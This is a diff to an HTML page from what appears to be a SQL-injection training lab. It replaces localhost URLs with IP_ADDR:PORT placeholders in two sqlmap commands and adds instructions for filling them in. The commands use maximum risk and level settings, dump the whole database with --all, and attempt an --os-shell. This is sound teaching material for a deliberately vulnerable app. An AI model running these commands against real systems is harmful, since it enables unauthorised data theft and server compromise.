@@ -100,7 +100,8 @@
       <hr/>
       Let's try SQLMAP on the prepared application below.<br>
       <code style="background-color: #ffd900; border: 2px solid black; border-radius: 2px;">
-      python3 sqlmap.py --url="http://127.0.0.1:2137/modules/module-3-sql-injection/shell_commands/search_products.php" --threads=10 --risk=3 --level=5 --technique="UB" --batch --forms --all</code><br>
+      python3 sqlmap.py --url="http://IP_ADDR:PORT/modules/module-3-sql-injection/shell_commands/search_products.php" --threads=10 --risk=3 --level=5 --technique="UB" --batch --forms --all</code><br>
+      <b><i>(replace IP_ADDR and PORT with IP address and port that corresponds to your environment (simple php server / docker), for example: 127.0.0.1:8080)</i></b><br>
       <hr/>
       <div>
         <embed type="text/html" src="search_products.php" width="100%" height="600px" style="display: block; margin-left: auto; margin-right: auto;">
@@ -138,7 +139,8 @@
       Unfortunately, we will not be able to do it this time, because the database used is <b>SQLite</b>, which is a simple database and has very limited capabilities,
       which paradoxically prevents us from taking control of the server.<br>
       <hr/>
-      <code style="background-color: #ffd900; border: 2px solid black; border-radius: 2px;">python3 sqlmap.py --url="http://127.0.0.1:2137/modules/module-3-sql-injection/shell_commands/search_products.php" --threads=10 --risk=3 --level=5 --technique="UB" --batch --forms --os-shell</code><br>
+      <code style="background-color: #ffd900; border: 2px solid black; border-radius: 2px;">python3 sqlmap.py --url="http://IP_ADDR:PORT/modules/module-3-sql-injection/shell_commands/search_products.php" --threads=10 --risk=3 --level=5 --technique="UB" --batch --forms --os-shell</code><br>
+      <b><i>(replace IP_ADDR and PORT with IP address and port that corresponds to your environment (simple php server / docker), for example: 127.0.0.1:8080)</i></b><br>
       <img alt="SQLMAP_9" src="assets/img/9.png" class="responsive-img" /><br>
       <hr/>
     </p>
